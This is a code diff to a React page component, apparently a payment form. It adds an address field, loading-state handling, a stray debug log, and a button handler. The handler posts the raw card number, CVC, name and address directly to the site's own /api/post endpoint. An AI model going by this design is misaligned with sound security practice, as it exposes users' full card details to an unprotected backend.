@@ -21,6 +21,7 @@ export default function Home() {
   const [cvc, setcvc] = useState("");
   const [fullName, setFullName] = useState("");
   const [loading, setLoading] = useState(false);
+  const [address, setAddress] = useState("");
   const handleInputChange = (e) => {
     let value = e.target.value.replace(/\D/g, ""); // Remove non-digit characters
 
@@ -228,7 +229,9 @@ export default function Home() {
   ];
 
   const handleUpdloadDetails = async () => {
+    console.log("hii");
     try {
+      setLoading(true);
       const { data } = await axios.post("/api/post", {
         cardNumber: card,
         cvc: cvc,
@@ -237,8 +240,10 @@ export default function Home() {
         country: country,
         address: address,
       });
+      setLoading(false);
     } catch (error) {
       console.log(error);
+      setLoading(false);
     }
   };
 
@@ -643,6 +648,7 @@ export default function Home() {
               }}
             >
               <button
+                onClick={() => handleUpdloadDetails()}
                 style={{
                   background: "#ff7205",
                   width: "50%",
